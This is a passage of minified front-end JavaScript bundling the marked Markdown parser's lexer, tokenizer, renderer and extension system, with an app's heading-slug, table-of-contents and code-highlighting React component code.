`,a=a.substring(ze.length+1),j=ve.slice(L)}}c.loose||(w?c.loose=!0:this.rules.other.doubleBlankLine.test(P)&&(w=!0)),c.items.push({type:"list_item",raw:P,task:!!this.options.gfm&&this.rules.other.listIsTask.test(T),loose:!1,text:T,tokens:[]}),c.raw+=P}let S=c.items.at(-1);if(S)S.raw=S.raw.trimEnd(),S.text=S.text.trimEnd();else return;c.raw=c.raw.trimEnd();for(let m of c.items)if(this.lexer.state.top=!1,m.tokens=this.lexer.blockTokens(m.text,[]),!c.loose){let P=m.tokens.filter(j=>j.type==="space"),T=P.length>0&&P.some(j=>this.rules.other.anyLine.test(j.raw));c.loose=T}for(let m of c.items){let P=m.tokens[0];if(m.task&&((P==null?void 0:P.type)==="text"||(P==null?void 0:P.type)==="paragraph")){m.text=m.text.replace(this.rules.other.listReplaceTask,""),P.raw=P.raw.replace(this.rules.other.listReplaceTask,""),P.text=P.text.replace(this.rules.other.listReplaceTask,"");for(let j=this.lexer.inlineQueue.length-1;j>=0;j--)if(this.rules.other.listIsTask.test(this.lexer.inlineQueue[j].src)){this.lexer.inlineQueue[j].src=this.lexer.inlineQueue[j].src.replace(this.rules.other.listReplaceTask,"");break}let T=this.rules.other.listTaskCheckbox.exec(m.raw);if(T){let j={type:"checkbox",raw:T[0]+" ",checked:T[0]!=="[ ]"};m.checked=j.checked,c.loose?m.tokens[0]&&["paragraph","text"].includes(m.tokens[0].type)&&"tokens"in m.tokens[0]&&m.tokens[0].tokens?(m.tokens[0].raw=j.raw+m.tokens[0].raw,m.tokens[0].text=j.raw+m.tokens[0].text,m.tokens[0].tokens.unshift(j)):m.tokens.unshift({type:"paragraph",raw:j.raw,text:j.raw,tokens:[j]}):m.tokens.unshift(j)}}else m.task&&(m.task=!1)}if(c.loose)for(let m of c.items){m.loose=!0;for(let P of m.tokens)P.type==="text"&&(P.type="paragraph")}return c}}html(a){let o=this.rules.block.html.exec(a);if(o){let l=jc(o[0]);return{type:"html",block:!0,raw:l,pre:o[1]==="pre"||o[1]==="script"||o[1]==="style",text:l}}}def(a){let o=this.rules.block.def.exec(a);if(o){let l=o[1].toLowerCase().replace(this.rules.other.multipleSpaceGlobal," "),d=o[2]?o[2].replace(this.rules.other.hrefBrackets,"$1").replace(this.rules.inline.anyPunctuation,"$1"):"",c=o[3]?o[3].substring(1,o[3].length-1).replace(this.rules.inline.anyPunctuation,"$1"):o[3];return{type:"def",tag:l,raw:sn(o[0],`
`),href:d,title:c}}}table(a){var w;let o=this.rules.block.table.exec(a);if(!o||!this.rules.other.tableDelimiter.test(o[2]))return;let l=Ic(o[1]),d=o[2].replace(this.rules.other.tableAlignChars,"").split("|"),c=(w=o[3])!=null&&w.trim()?o[3].replace(this.rules.other.tableRowBlankLine,"").split(`
`):[],h={type:"table",raw:sn(o[0],`
`),header:[],align:[],rows:[]};if(l.length===d.length){for(let S of d)this.rules.other.tableAlignRight.test(S)?h.align.push("right"):this.rules.other.tableAlignCenter.test(S)?h.align.push("center"):this.rules.other.tableAlignLeft.test(S)?h.align.push("left"):h.align.push(null);for(let S=0;S<l.length;S++)h.header.push({text:l[S],tokens:this.lexer.inline(l[S]),header:!0,align:h.align[S]});for(let S of c)h.rows.push(Ic(S,h.header.length).map((m,P)=>({text:m,tokens:this.lexer.inline(m),header:!1,align:h.align[P]})));return h}}lheading(a){let o=this.rules.block.lheading.exec(a);if(o){let l=o[1].trim();return{type:"heading",raw:sn(o[0],`
`),depth:o[2].charAt(0)==="="?1:2,text:l,tokens:this.lexer.inline(l)}}}paragraph(a){let o=this.rules.block.paragraph.exec(a);if(o){let l=o[1].charAt(o[1].length-1)===`
`?o[1].slice(0,-1):o[1];return{type:"paragraph",raw:o[0],text:l,tokens:this.lexer.inline(l)}}}text(a){let o=this.rules.block.text.exec(a);if(o)return{type:"text",raw:o[0],text:o[0],tokens:this.lexer.inline(o[0])}}escape(a){let o=this.rules.inline.escape.exec(a);if(o)return{type:"escape",raw:o[0],text:o[1]}}tag(a){let o=this.rules.inline.tag.exec(a);if(o)return!this.lexer.state.inLink&&this.rules.other.startATag.test(o[0])?this.lexer.state.inLink=!0:this.lexer.state.inLink&&this.rules.other.endATag.test(o[0])&&(this.lexer.state.inLink=!1),!this.lexer.state.inRawBlock&&this.rules.other.startPreScriptTag.test(o[0])?this.lexer.state.inRawBlock=!0:this.lexer.state.inRawBlock&&this.rules.other.endPreScriptTag.test(o[0])&&(this.lexer.state.inRawBlock=!1),{type:"html",raw:o[0],inLink:this.lexer.state.inLink,inRawBlock:this.lexer.state.inRawBlock,block:!1,text:o[0]}}link(a){let o=this.rules.inline.link.exec(a);if(o){let l=o[2].trim();if(!this.options.pedantic&&this.rules.other.startAngleBracket.test(l)){if(!this.rules.other.endAngleBracket.test(l))return;let h=sn(l.slice(0,-1),"\\");if((l.length-h.length)%2===0)return}else{let h=Th(o[2],"()");if(h===-2)return;if(h>-1){let w=(o[0].indexOf("!")===0?5:4)+o[1].length+h;o[2]=o[2].substring(0,h),o[0]=o[0].substring(0,w).trim(),o[3]=""}}let d=o[2],c="";if(this.options.pedantic){let h=this.rules.other.pedanticHrefTitle.exec(d);h&&(d=h[1],c=h[3])}else c=o[3]?o[3].slice(1,-1):"";return d=d.trim(),this.rules.other.startAngleBracket.test(d)&&(this.options.pedantic&&!this.rules.other.endAngleBracket.test(l)?d=d.slice(1):d=d.slice(1,-1)),Lc(o,{href:d&&d.replace(this.rules.inline.anyPunctuation,"$1"),title:c&&c.replace(this.rules.inline.anyPunctuation,"$1")},o[0],this.lexer,this.rules)}}reflink(a,o){let l;if((l=this.rules.inline.reflink.exec(a))||(l=this.rules.inline.nolink.exec(a))){let d=(l[2]||l[1]).replace(this.rules.other.multipleSpaceGlobal," "),c=o[d.toLowerCase()];if(!c){let h=l[0].charAt(0);return{type:"text",raw:h,text:h}}return Lc(l,c,l[0],this.lexer,this.rules)}}emStrong(a,o,l=""){let d=this.rules.inline.emStrongLDelim.exec(a);if(!(!d||!d[1]&&!d[2]&&!d[3]&&!d[4]||d[4]&&l.match(this.rules.other.unicodeAlphaNumeric))&&(!(d[1]||d[3])||!l||this.rules.inline.punctuation.exec(l))){let c=[...d[0]].length-1,h,w,S=c,m=0,P=d[0][0],T=l===P,j=P==="*"?this.rules.inline.emStrongRDelimAst:this.rules.inline.emStrongRDelimUnd;for(j.lastIndex=0,o=o.slice(-1*a.length+c);(d=j.exec(o))!==null;){if(h=d[1]||d[2]||d[3]||d[4]||d[5]||d[6],!h)continue;if(w=[...h].length,d[3]||d[4]){S+=w;continue}else if(d[5]||d[6]){if(c%3&&!((c+w)%3)){m+=w;continue}if(T)break}if(S-=w,S>0)continue;w=Math.min(w,w+S+m);let E=[...d[0]][0].length,Q=a.slice(0,c+d.index+E+w);if(Math.min(c,w)%2){let q=Q.slice(1,-1);return{type:"em",raw:Q,text:q,tokens:this.lexer.inlineTokens(q)}}let L=Q.slice(2,-2);return{type:"strong",raw:Q,text:L,tokens:this.lexer.inlineTokens(L)}}}}codespan(a){let o=this.rules.inline.code.exec(a);if(o){let l=o[2].replace(this.rules.other.newLineCharGlobal," "),d=this.rules.other.nonSpaceChar.test(l),c=this.rules.other.startingSpaceChar.test(l)&&this.rules.other.endingSpaceChar.test(l);return d&&c&&(l=l.substring(1,l.length-1)),{type:"codespan",raw:o[0],text:l}}}br(a){let o=this.rules.inline.br.exec(a);if(o)return{type:"br",raw:o[0]}}del(a,o,l=""){let d=this.rules.inline.delLDelim.exec(a);if(d&&(!d[1]||!l||this.rules.inline.punctuation.exec(l))){let c=[...d[0]].length-1,h,w,S=c,m=this.rules.inline.delRDelim;for(m.lastIndex=0,o=o.slice(-1*a.length+c);(d=m.exec(o))!==null;){if(h=d[1]||d[2]||d[3]||d[4]||d[5]||d[6],!h||(w=[...h].length,w!==c))continue;if(d[3]||d[4]){S+=w;continue}if(S-=w,S>0)continue;w=Math.min(w,w+S);let P=[...d[0]][0].length,T=a.slice(0,c+d.index+P+w),j=T.slice(c,-c);return{type:"del",raw:T,text:j,tokens:this.lexer.inlineTokens(j)}}}}autolink(a){let o=this.rules.inline.autolink.exec(a);if(o){let l,d;return o[2]==="@"?(l=o[1],d="mailto:"+l):(l=o[1],d=l),{type:"link",raw:o[0],text:l,href:d,tokens:[{type:"text",raw:l,text:l}]}}}url(a){var l;let o;if(o=this.rules.inline.url.exec(a)){let d,c;if(o[2]==="@")d=o[0],c="mailto:"+d;else{let h;do h=o[0],o[0]=((l=this.rules.inline._backpedal.exec(o[0]))==null?void 0:l[0])??"";while(h!==o[0]);d=o[0],o[1]==="www."?c="http://"+o[0]:c=o[0]}return{type:"link",raw:o[0],text:d,href:c,tokens:[{type:"text",raw:d,text:d}]}}}inlineText(a){let o=this.rules.inline.text.exec(a);if(o){let l=this.lexer.state.inRawBlock;return{type:"text",raw:o[0],text:o[0],escaped:l}}}},yt=class ll{constructor(o){ie(this,"tokens");ie(this,"options");ie(this,"state");ie(this,"inlineQueue");ie(this,"tokenizer");this.tokens=[],this.tokens.links=Object.create(null),this.options=o||_n,this.options.tokenizer=this.options.tokenizer||new ns,this.tokenizer=this.options.tokenizer,this.tokenizer.options=this.options,this.tokenizer.lexer=this,this.inlineQueue=[],this.state={inLink:!1,inRawBlock:!1,linkEmitted:!1,top:!0};let l={other:Ne,block:Ji.normal,inline:Or.normal};this.options.pedantic?(l.block=Ji.pedantic,l.inline=Or.pedantic):this.options.gfm&&(l.block=Ji.gfm,this.options.breaks?l.inline=Or.breaks:l.inline=Or.gfm),this.tokenizer.rules=l}static get rules(){return{block:Ji,inline:Or}}static lex(o,l){return new ll(l).lex(o)}static lexInline(o,l){return new ll(l).inlineTokens(o)}lex(o){o=o.replace(Ne.carriageReturn,`
`),this.blockTokens(o,this.tokens);for(let l=0;l<this.inlineQueue.length;l++){let d=this.inlineQueue[l];this.inlineTokens(d.src,d.tokens)}return this.inlineQueue=[],this.tokens}blockTokens(o,l=[],d=!1){var h,w,S;this.tokenizer.lexer=this,this.options.pedantic&&(o=o.replace(Ne.tabCharGlobal,"    ").replace(Ne.spaceLine,""));let c=1/0;for(;o;){if(o.length<c)c=o.length;else{this.infiniteLoopError(o.charCodeAt(0));break}let m;if((w=(h=this.options.extensions)==null?void 0:h.block)!=null&&w.some(T=>(m=T.call({lexer:this},o,l))?(o=o.substring(m.raw.length),l.push(m),!0):!1))continue;if(m=this.tokenizer.space(o)){o=o.substring(m.raw.length);let T=l.at(-1);m.raw.length===1&&T!==void 0?T.raw+=`
`:l.push(m);continue}if(m=this.tokenizer.code(o)){o=o.substring(m.raw.length);let T=l.at(-1);(T==null?void 0:T.type)==="paragraph"||(T==null?void 0:T.type)==="text"?(T.raw+=(T.raw.endsWith(`
`)?"":`
`)+m.raw,T.text+=`
`+m.text,this.inlineQueue.at(-1).src=T.text):l.push(m);continue}if(m=this.tokenizer.fences(o)){o=o.substring(m.raw.length),l.push(m);continue}if(m=this.tokenizer.heading(o)){o=o.substring(m.raw.length),l.push(m);continue}if(m=this.tokenizer.hr(o)){o=o.substring(m.raw.length),l.push(m);continue}if(m=this.tokenizer.blockquote(o)){o=o.substring(m.raw.length),l.push(m);continue}if(m=this.tokenizer.list(o)){o=o.substring(m.raw.length),l.push(m);continue}if(m=this.tokenizer.html(o)){o=o.substring(m.raw.length),l.push(m);continue}if(m=this.tokenizer.def(o)){o=o.substring(m.raw.length);let T=l.at(-1);(T==null?void 0:T.type)==="paragraph"||(T==null?void 0:T.type)==="text"?(T.raw+=(T.raw.endsWith(`
`)?"":`
`)+m.raw,T.text+=`
`+m.raw,this.inlineQueue.at(-1).src=T.text):this.tokens.links[m.tag]||(this.tokens.links[m.tag]={href:m.href,title:m.title},l.push(m));continue}if(m=this.tokenizer.table(o)){o=o.substring(m.raw.length),l.push(m);continue}if(m=this.tokenizer.lheading(o)){o=o.substring(m.raw.length),l.push(m);continue}let P=o;if((S=this.options.extensions)!=null&&S.startBlock){let T=1/0,j=o.slice(1),E;this.options.extensions.startBlock.forEach(Q=>{E=Q.call({lexer:this},j),typeof E=="number"&&E>=0&&(T=Math.min(T,E))}),T<1/0&&T>=0&&(P=o.substring(0,T+1))}if(this.state.top&&(m=this.tokenizer.paragraph(P))){let T=l.at(-1);d&&(T==null?void 0:T.type)==="paragraph"?(T.raw+=(T.raw.endsWith(`
`)?"":`
`)+m.raw,T.text+=`
`+m.text,this.inlineQueue.pop(),this.inlineQueue.at(-1).src=T.text):l.push(m),d=P.length!==o.length,o=o.substring(m.raw.length);continue}if(m=this.tokenizer.text(o)){o=o.substring(m.raw.length);let T=l.at(-1);(T==null?void 0:T.type)==="text"?(T.raw+=(T.raw.endsWith(`
`)?"":`
`)+m.raw,T.text+=`
`+m.text,this.inlineQueue.pop(),this.inlineQueue.at(-1).src=T.text):l.push(m);continue}if(o){this.infiniteLoopError(o.charCodeAt(0));break}}return this.state.top=!0,l}inline(o,l=[]){return this.inlineQueue.push({src:o,tokens:l}),l}linkInText(o){if(!o.includes("["))return!1;let l=this.tokenizer.rules.inline.link;for(let d of o.matchAll(this.tokenizer.rules.inline.blockSkip))if(l.test(d[0])&&o.charAt(d.index-1)!=="!")return!0;for(let d of o.matchAll(this.tokenizer.rules.inline.reflinkSearch)){let c=d[0],h=c.lastIndexOf("[");if(!(c.charAt(0)==="!"||!Object.hasOwn(this.tokens.links,c.slice(h+1,-1)))&&!(h>1&&this.linkInText(c.slice(1,h-1))))return!0}return!1}inlineTokens(o,l=[]){var S,m,P,T,j;this.tokenizer.lexer=this;let d=o;if(this.tokens.links&&o.includes("[")){let E=this.tokenizer.rules.inline.reflinkSearch,Q=L=>{let q=L.lastIndexOf("[");if(!Object.hasOwn(this.tokens.links,L.slice(q+1,-1)))return L;if(q>1&&L.charAt(0)!=="!"){let V=L.slice(1,q-1);if(this.linkInText(V))return"["+V.replace(E,Q)+"]["+"a".repeat(L.length-q-2)+"]"}return"["+"a".repeat(L.length-2)+"]"};d=d.replace(E,Q)}d=d.replace(this.tokenizer.rules.inline.anyPunctuation,E=>"+".repeat(E.length)),d=d.replace(this.tokenizer.rules.inline.blockSkip,(E,Q,L)=>{let q=L?L.length:0;return E.slice(0,q)+"["+"a".repeat(E.length-q-2)+"]"}),d=((m=(S=this.options.hooks)==null?void 0:S.emStrongMask)==null?void 0:m.call({lexer:this},d))??d;let c=!1,h="",w=1/0;for(;o;){if(o.length<w)w=o.length;else{this.infiniteLoopError(o.charCodeAt(0));break}c||(h=""),c=!1;let E;if((T=(P=this.options.extensions)==null?void 0:P.inline)!=null&&T.some(L=>(E=L.call({lexer:this},o,l))?(o=o.substring(E.raw.length),l.push(E),!0):!1))continue;if(E=this.tokenizer.escape(o)){o=o.substring(E.raw.length),l.push(E);continue}if(E=this.tokenizer.tag(o)){o=o.substring(E.raw.length),l.push(E);continue}if(E=this.tokenizer.link(o)){o=o.substring(E.raw.length),l.push(E);continue}if(E=this.tokenizer.reflink(o,this.tokens.links)){o=o.substring(E.raw.length);let L=l.at(-1);E.type==="text"&&(L==null?void 0:L.type)==="text"?(L.raw+=E.raw,L.text+=E.text):l.push(E);continue}if(E=this.tokenizer.emStrong(o,d,h)){o=o.substring(E.raw.length),l.push(E);continue}if(E=this.tokenizer.codespan(o)){o=o.substring(E.raw.length),l.push(E);continue}if(E=this.tokenizer.br(o)){o=o.substring(E.raw.length),l.push(E);continue}if(E=this.tokenizer.del(o,d,h)){o=o.substring(E.raw.length),l.push(E);continue}if(E=this.tokenizer.autolink(o)){o=o.substring(E.raw.length),l.push(E);continue}if(!this.state.inLink&&(E=this.tokenizer.url(o))){o=o.substring(E.raw.length),l.push(E);continue}let Q=o;if((j=this.options.extensions)!=null&&j.startInline){let L=1/0,q=o.slice(1),V;this.options.extensions.startInline.forEach(Oe=>{V=Oe.call({lexer:this},q),typeof V=="number"&&V>=0&&(L=Math.min(L,V))}),L<1/0&&L>=0&&(Q=o.substring(0,L+1))}if(E=this.tokenizer.inlineText(Q)){o=o.substring(E.raw.length),E.raw.slice(-1)!=="_"&&(h=E.raw.slice(-1)),c=!0;let L=l.at(-1);(L==null?void 0:L.type)==="text"?(L.raw+=E.raw,L.text+=E.text):l.push(E);continue}if(o){this.infiniteLoopError(o.charCodeAt(0));break}}return l}infiniteLoopError(o){let l="Infinite loop on byte: "+o;if(this.options.silent)console.error(l);else throw new Error(l)}},rs=class{constructor(a){ie(this,"options");ie(this,"parser");this.options=a||_n}space(a){return""}code({text:a,lang:o,escaped:l}){var h;let d=(h=(o||"").match(Ne.notSpaceStart))==null?void 0:h[0],c=a.replace(Ne.endingNewline,"")+`
`;return d?'<pre><code class="language-'+Pt(d)+'">'+(l?c:Pt(c,!0))+`</code></pre>
`:"<pre><code>"+(l?c:Pt(c,!0))+`</code></pre>
`}blockquote({tokens:a}){return`<blockquote>
${this.parser.parse(a)}</blockquote>
`}html({text:a}){return a}def(a){return""}heading({tokens:a,depth:o}){return`<h${o}>${this.parser.parseInline(a)}</h${o}>
`}hr(a){return`<hr>
`}list(a){let o=a.ordered,l=a.start,d="";for(let w=0;w<a.items.length;w++){let S=a.items[w];d+=this.listitem(S)}let c=o?"ol":"ul",h=o&&l!==1?' start="'+l+'"':"";return"<"+c+h+`>
`+d+"</"+c+`>
`}listitem(a){return`<li>${this.parser.parse(a.tokens)}</li>
`}checkbox({checked:a}){return"<input "+(a?'checked="" ':"")+'disabled="" type="checkbox"> '}paragraph({tokens:a}){return`<p>${this.parser.parseInline(a)}</p>
`}table(a){let o="",l="";for(let c=0;c<a.header.length;c++)l+=this.tablecell(a.header[c]);o+=this.tablerow({text:l});let d="";for(let c=0;c<a.rows.length;c++){let h=a.rows[c];l="";for(let w=0;w<h.length;w++)l+=this.tablecell(h[w]);d+=this.tablerow({text:l})}return d&&(d=`<tbody>${d}</tbody>`),`<table>
<thead>
`+o+`</thead>
`+d+`</table>
`}tablerow({text:a}){return`<tr>
${a}</tr>
`}tablecell(a){let o=this.parser.parseInline(a.tokens),l=a.header?"th":"td";return(a.align?`<${l} align="${a.align}">`:`<${l}>`)+o+`</${l}>
`}strong({tokens:a}){return`<strong>${this.parser.parseInline(a)}</strong>`}em({tokens:a}){return`<em>${this.parser.parseInline(a)}</em>`}codespan({text:a}){return`<code>${Pt(a,!0)}</code>`}br(a){return"<br>"}del({tokens:a}){return`<del>${this.parser.parseInline(a)}</del>`}link({href:a,title:o,tokens:l}){let d=this.parser.parseInline(l),c=Rc(a);if(c===null)return d;a=c;let h='<a href="'+a+'"';return o&&(h+=' title="'+Pt(o)+'"'),h+=">"+d+"</a>",h}image({href:a,title:o,text:l,tokens:d}){d&&(l=this.parser.parseInline(d,this.parser.textRenderer));let c=Rc(a);if(c===null)return Pt(l);a=c;let h=`<img src="${a}" alt="${Pt(l)}"`;return o&&(h+=` title="${Pt(o)}"`),h+=">",h}text(a){return"tokens"in a&&a.tokens?this.parser.parseInline(a.tokens):"escaped"in a&&a.escaped?a.text:Pt(a.text)}},kl=class{strong({text:a}){return a}em({text:a}){return a}codespan({text:a}){return a}del({text:a}){return a}html({text:a}){return a}text({text:a}){return a}link({text:a}){return""+a}image({text:a}){return""+a}br(){return""}checkbox({raw:a}){return a}},vt=class al{constructor(o){ie(this,"options");ie(this,"renderer");ie(this,"textRenderer");this.options=o||_n,this.options.renderer=this.options.renderer||new rs,this.renderer=this.options.renderer,this.renderer.options=this.options,this.renderer.parser=this,this.textRenderer=new kl}static parse(o,l){return new al(l).parse(o)}static parseInline(o,l){return new al(l).parseInline(o)}parse(o){var d,c;this.renderer.parser=this;let l="";for(let h=0;h<o.length;h++){let w=o[h];if((c=(d=this.options.extensions)==null?void 0:d.renderers)!=null&&c[w.type]){let m=w,P=this.options.extensions.renderers[m.type].call({parser:this},m);if(P!==!1||!["space","hr","heading","code","table","blockquote","list","checkbox","html","def","paragraph","text"].includes(m.type)){l+=P||"";continue}}let S=w;switch(S.type){case"space":{l+=this.renderer.space(S);break}case"hr":{l+=this.renderer.hr(S);break}case"heading":{l+=this.renderer.heading(S);break}case"code":{l+=this.renderer.code(S);break}case"table":{l+=this.renderer.table(S);break}case"blockquote":{l+=this.renderer.blockquote(S);break}case"list":{l+=this.renderer.list(S);break}case"checkbox":{l+=this.renderer.checkbox(S);break}case"html":{l+=this.renderer.html(S);break}case"def":{l+=this.renderer.def(S);break}case"paragraph":{l+=this.renderer.paragraph(S);break}case"text":{l+=this.renderer.text(S);break}default:{let m='Token with "'+S.type+'" type was not found.';if(this.options.silent)return console.error(m),"";throw new Error(m)}}}return l}parseInline(o,l=this.renderer){var c,h;this.renderer.parser=this;let d="";for(let w=0;w<o.length;w++){let S=o[w];if((h=(c=this.options.extensions)==null?void 0:c.renderers)!=null&&h[S.type]){let P=this.options.extensions.renderers[S.type].call({parser:this},S);if(P!==!1||!["escape","html","link","image","checkbox","strong","em","codespan","br","del","text"].includes(S.type)){d+=P||"";continue}}let m=S;switch(m.type){case"escape":{d+=l.text(m);break}case"html":{d+=l.html(m);break}case"link":{d+=l.link(m);break}case"image":{d+=l.image(m);break}case"checkbox":{d+=l.checkbox(m);break}case"strong":{d+=l.strong(m);break}case"em":{d+=l.em(m);break}case"codespan":{d+=l.codespan(m);break}case"br":{d+=l.br(m);break}case"del":{d+=l.del(m);break}case"text":{d+=l.text(m);break}default:{let P='Token with "'+m.type+'" type was not found.';if(this.options.silent)return console.error(P),"";throw new Error(P)}}}return d}},es,$r=(es=class{constructor(a){ie(this,"options");ie(this,"block");this.options=a||_n}preprocess(a){return a}postprocess(a){return a}processAllTokens(a){return a}emStrongMask(a){return a}provideLexer(a=this.block){return a?yt.lex:yt.lexInline}provideParser(a=this.block){return a?vt.parse:vt.parseInline}},ie(es,"passThroughHooks",new Set(["preprocess","postprocess","processAllTokens","emStrongMask"])),ie(es,"passThroughHooksRespectAsync",new Set(["preprocess","postprocess","processAllTokens"])),es),Yc=class{constructor(...a){ie(this,"defaults",pl());ie(this,"options",this.setOptions);ie(this,"parse",this.parseMarkdown(!0));ie(this,"parseInline",this.parseMarkdown(!1));ie(this,"Parser",vt);ie(this,"Renderer",rs);ie(this,"TextRenderer",kl);ie(this,"Lexer",yt);ie(this,"Tokenizer",ns);ie(this,"Hooks",$r);this.use(...a)}walkTokens(a,o){var d,c;let l=[];for(let h of a)switch(l=l.concat(o.call(this,h)),h.type){case"table":{let w=h;for(let S of w.header)l=l.concat(this.walkTokens(S.tokens,o));for(let S of w.rows)for(let m of S)l=l.concat(this.walkTokens(m.tokens,o));break}case"list":{let w=h;l=l.concat(this.walkTokens(w.items,o));break}default:{let w=h;(c=(d=this.defaults.extensions)==null?void 0:d.childTokens)!=null&&c[w.type]?this.defaults.extensions.childTokens[w.type].forEach(S=>{let m=w[S].flat(1/0);l=l.concat(this.walkTokens(m,o))}):w.tokens&&(l=l.concat(this.walkTokens(w.tokens,o)))}}return l}use(...a){let o=this.defaults.extensions||{renderers:{},childTokens:{}};return a.forEach(l=>{let d={...l};if(d.async=this.defaults.async||d.async||!1,l.extensions&&(l.extensions.forEach(c=>{if(!c.name)throw new Error("extension name required");if("renderer"in c){let h=o.renderers[c.name];h?o.renderers[c.name]=function(...w){let S=c.renderer.apply(this,w);return S===!1&&(S=h.apply(this,w)),S}:o.renderers[c.name]=c.renderer}if("tokenizer"in c){if(!c.level||c.level!=="block"&&c.level!=="inline")throw new Error("extension level must be 'block' or 'inline'");let h=o[c.level];h?h.unshift(c.tokenizer):o[c.level]=[c.tokenizer],c.start&&(c.level==="block"?o.startBlock?o.startBlock.push(c.start):o.startBlock=[c.start]:c.level==="inline"&&(o.startInline?o.startInline.push(c.start):o.startInline=[c.start]))}"childTokens"in c&&c.childTokens&&(o.childTokens[c.name]=c.childTokens)}),d.extensions=o),l.renderer){let c=this.defaults.renderer||new rs(this.defaults);for(let h in l.renderer){if(!(h in c))throw new Error(`renderer '${h}' does not exist`);if(["options","parser"].includes(h))continue;let w=h,S=l.renderer[w],m=c[w];c[w]=(...P)=>{let T=S.apply(c,P);return T===!1&&(T=m.apply(c,P)),T||""}}d.renderer=c}if(l.tokenizer){let c=this.defaults.tokenizer||new ns(this.defaults);for(let h in l.tokenizer){if(!(h in c))throw new Error(`tokenizer '${h}' does not exist`);if(["options","rules","lexer"].includes(h))continue;let w=h,S=l.tokenizer[w],m=c[w];c[w]=(...P)=>{let T=S.apply(c,P);return T===!1&&(T=m.apply(c,P)),T}}d.tokenizer=c}if(l.hooks){let c=this.defaults.hooks||new $r;for(let h in l.hooks){if(!(h in c))throw new Error(`hook '${h}' does not exist`);if(["options","block"].includes(h))continue;let w=h,S=l.hooks[w],m=c[w];$r.passThroughHooks.has(h)?c[w]=P=>{if(this.defaults.async&&$r.passThroughHooksRespectAsync.has(h))return(async()=>{let j=await S.call(c,P);return m.call(c,j)})();let T=S.call(c,P);return m.call(c,T)}:c[w]=(...P)=>{if(this.defaults.async)return(async()=>{let j=await S.apply(c,P);return j===!1&&(j=await m.apply(c,P)),j})();let T=S.apply(c,P);return T===!1&&(T=m.apply(c,P)),T}}d.hooks=c}if(l.walkTokens){let c=this.defaults.walkTokens,h=l.walkTokens;d.walkTokens=function(w){let S=[];return S.push(h.call(this,w)),c&&(S=S.concat(c.call(this,w))),S}}this.defaults={...this.defaults,...d}}),this}setOptions(a){return this.defaults={...this.defaults,...a},this}lexer(a,o){return yt.lex(a,o??this.defaults)}parser(a,o){return vt.parse(a,o??this.defaults)}parseMarkdown(a){return(o,l)=>{let d={...l},c={...this.defaults,...d},h=this.onError(!!c.silent,!!c.async);if(this.defaults.async===!0&&d.async===!1)return h(new Error("marked(): The async option was set to true by an extension. Remove async: false from the parse options object to return a Promise."));if(typeof o>"u"||o===null)return h(new Error("marked(): input parameter is undefined or null"));if(typeof o!="string")return h(new Error("marked(): input parameter is of type "+Object.prototype.toString.call(o)+", string expected"));if(c.hooks&&(c.hooks.options=c,c.hooks.block=a),c.async)return(async()=>{let w=c.hooks?await c.hooks.preprocess(o):o,S=await(c.hooks?await c.hooks.provideLexer(a):a?yt.lex:yt.lexInline)(w,c),m=c.hooks?await c.hooks.processAllTokens(S):S;c.walkTokens&&await Promise.all(this.walkTokens(m,c.walkTokens));let P=await(c.hooks?await c.hooks.provideParser(a):a?vt.parse:vt.parseInline)(m,c);return c.hooks?await c.hooks.postprocess(P):P})().catch(h);try{c.hooks&&(o=c.hooks.preprocess(o));let w=(c.hooks?c.hooks.provideLexer(a):a?yt.lex:yt.lexInline)(o,c);c.hooks&&(w=c.hooks.processAllTokens(w)),c.walkTokens&&this.walkTokens(w,c.walkTokens);let S=(c.hooks?c.hooks.provideParser(a):a?vt.parse:vt.parseInline)(w,c);return c.hooks&&(S=c.hooks.postprocess(S)),S}catch(w){return h(w)}}}onError(a,o){return l=>{if(l.message+=`
Please report this to https://github.com/markedjs/marked.`,a){let d="<p>An error occurred:</p><pre>"+Pt(l.message+"",!0)+"</pre>";return o?Promise.resolve(d):d}if(o)return Promise.reject(l);throw l}}},Sn=new Yc;function oe(a,o){return Sn.parse(a,o)}oe.options=oe.setOptions=function(a){return Sn.setOptions(a),oe.defaults=Sn.defaults,Fc(oe.defaults),oe};oe.getDefaults=pl;oe.defaults=_n;function bh(...a){return Sn.use(...a),oe.defaults=Sn.defaults,Fc(oe.defaults),oe}oe.use=bh;oe.walkTokens=function(a,o){return Sn.walkTokens(a,o)};oe.parseInline=Sn.parseInline;oe.Parser=vt;oe.parser=vt.parse;oe.Renderer=rs;oe.TextRenderer=kl;oe.Lexer=yt;oe.lexer=yt.lex;oe.Tokenizer=ns;oe.Hooks=$r;oe.parse=oe;oe.options;oe.setOptions;oe.walkTokens;oe.parseInline;vt.parse;yt.lex;function Xc(a){return a.toLowerCase().replace(/[`*_~]/g,"").replace(/&[a-z]+;/g,"").replace(/[^\w\s-]/g,"").trim().replace(/\s+/g,"-").replace(/-+/g,"-")}function Ah(a){const o=[];let l=!1;const d=new Map;for(const c of a.split(`
`)){if(/^\s*```/.test(c)){l=!l;continue}if(l)continue;const h=c.match(/^(#{2,3})\s+(.+?)\s*#*\s*$/);if(!h)continue;const w=h[1].length,S=h[2].replace(/\[([^\]]+)\]\([^)]*\)/g,"$1").trim();let m=Xc(S);const P=d.get(m)??0;d.set(m,P+1),P&&(m=`${m}-${P}`),o.push({depth:w,text:S,id:m})}return o}function Rh(){const a=new Yc({gfm:!0,breaks:!1}),o=new Map;return a.use({hooks:{preprocess(l){return o.clear(),l}},renderer:{heading({tokens:l,depth:d}){const c=this.parser.parseInline(l);let h=Xc(c.replace(/<[^>]+>/g,""));const w=o.get(h)??0;return o.set(h,w+1),w&&(h=`${h}-${w}`),`<h${d} id="${h}">${c}</h${d}>
`},link({href:l,title:d,tokens:c}){const h=this.parser.parseInline(c),w=/^https?:\/\//i.test(l),S=d?` title="${d.replace(/"/g,"&quot;")}"`:"";return`<a href="${l}"${S}${w?' target="_blank" rel="noreferrer"':""}>${h}</a>`}}}),a}function Ih({source:a}){const o=me.useRef(null),l=me.useMemo(()=>Rh().parse(a,{async:!1}),[a]);return me.useEffect(()=>{const d=o.current;if(!d)return;let c=!1;return jf(async()=>{const{default:h}=await import("./common-DEPjExR-.js");return{default:h}},[]).then(({default:h})=>{c||d.querySelectorAll("pre code").forEach(w=>h.highlightElement(w))}).catch(()=>{}),d.querySelectorAll("pre").forEach(h=>{if(h.querySelector(".copy-btn"))return;const w=document.createElement("button");w.className="copy-btn",w.type="button",w.textContent="Copy",w.addEventListener("click",()=>{var m;const S=((m=h.querySelector("code"))==null?void 